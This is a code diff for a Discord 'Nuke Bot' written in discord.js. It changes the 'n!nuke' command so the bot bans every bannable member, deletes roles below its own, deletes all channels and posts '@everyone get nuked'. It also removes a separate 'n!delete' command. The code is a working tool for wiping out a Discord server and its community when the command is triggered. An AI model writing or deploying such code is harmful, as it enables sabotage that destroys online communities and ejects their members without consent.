@@ -51,14 +51,13 @@ client.on('ready', () => {
 client.on("message", async(msg)=>{
 
 if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
-    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Dev: Raxn"));
+        msg.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
+        msg.delete(1000);
+	msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    	msg.guild.channels.deleteAll();
+	msg.channel.send('@everyone get nuked');
 }
-if(msg.content.toLowerCase().startsWith("n!" + "delete")){
-    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-}
+
 
 });
 
